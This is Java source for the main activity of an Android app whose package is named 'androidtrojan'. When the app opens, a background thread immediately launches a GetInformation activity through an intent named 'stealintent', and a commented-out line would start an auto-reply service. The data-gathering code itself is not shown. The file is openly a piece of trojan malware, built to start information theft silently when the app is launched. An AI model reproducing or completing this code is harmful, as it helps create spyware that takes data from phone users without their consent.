package com.example.gx.androidtrojan;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        new StartGetInformationThread(MainActivity.this).start();

//        Intent intent = new Intent(MainActivity.this, AutoReplyService.class);
//        startService(intent);
    }

    @Override
    protected void onStop() {
        super.onStop();
        Log.i(TAG, "onStop: executed");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "onDestroy: executed");
    }
}

class StartGetInformationThread extends Thread {
    private Context context;

    public StartGetInformationThread(Context context) {
        super();
        this.context = context;
    }

    //子进程执行的操作
    public void run() {
        Intent stealintent = new Intent(context, GetInformation.class);
        stealintent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(stealintent);
    }
}
